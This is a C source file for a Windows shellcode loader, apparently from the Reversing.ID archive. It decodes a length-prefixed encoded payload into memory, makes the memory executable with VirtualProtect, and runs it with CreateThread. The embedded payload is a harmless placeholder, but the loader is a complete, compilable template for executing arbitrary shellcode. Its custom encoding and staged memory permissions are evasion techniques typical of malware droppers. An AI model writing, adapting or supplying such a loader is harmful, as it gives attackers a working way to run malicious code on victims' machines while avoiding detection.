/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    padding
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [M] [M-byte Shellcode] [N] [N-byte Shellcode] ... [Z] [Z-byte Shellcode]

    M, N, .. Z is a single byte padding mark as block length.
*/

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.
*/
size_t transform (uint8_t * dst, uint8_t * src, size_t size)
{
    size_t idx = 0;

    size_t  pad;
    size_t  idx_dst = 0;
    size_t  idx_src = 0;

    while (idx_src < size)
    {
        pad = src[idx_src];

        memcpy(&dst[idx_dst], &src[idx_src + 1], pad);

        idx_dst += pad;
        idx_src += pad + 1;
    }
    return idx_dst;
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x02,0x90,0x90,0x02,0xcc,0xc3 };
    uint32_t    payload_len = 6;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}